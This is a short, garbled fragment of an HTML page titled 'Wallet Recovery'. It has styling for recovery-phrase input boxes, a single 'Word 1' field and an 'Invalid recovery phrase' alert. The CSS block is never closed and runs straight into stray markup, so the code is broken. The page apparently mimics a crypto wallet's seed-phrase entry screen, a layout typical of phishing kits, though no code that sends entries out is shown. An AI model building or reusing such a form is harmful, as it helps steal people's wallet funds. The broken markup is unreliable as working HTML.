<!DOCTYPE html>

<head>

    <title>Wallet Recovery</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            text-align: center;
        }

        .header {
            font-size: 24px;
            font-weight: bold;
            margin-top: 30px;
        }

        .subheader {
            font-size: 14px;
            color: #666;
            max-width: 600px;
            margin: 10px auto;
        }

        .phrase-container {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin: 20px 0;
        }

        .phrase-box {
            width: 150px;
            padding: 10px;
            margin: 5px;
            border: 2px solid #7d10b7;
            border-radius: 5px;
            background-color: #f9f9f9;
            font-size: 16px;
        }

        .continue-button {
            padding: 10px 20px;
            background-color: #7d10b7;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 30px;

        <input class="phrase-box" type="text" id="word1" placeholder="Word 1">

                alert('Invalid recovery phrase. Please try again.');

</html>
